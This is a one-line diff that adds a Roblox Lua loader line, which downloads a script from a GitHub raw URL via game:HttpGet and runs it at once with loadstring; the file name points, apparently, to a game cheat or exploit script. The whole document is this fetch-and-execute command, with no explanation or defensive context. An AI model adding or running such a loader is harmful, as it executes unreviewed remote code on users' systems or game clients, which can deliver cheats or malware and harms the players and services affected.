@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/new-mythic-hypershot-spam1-efgz9h18if6mfs.lua"))()
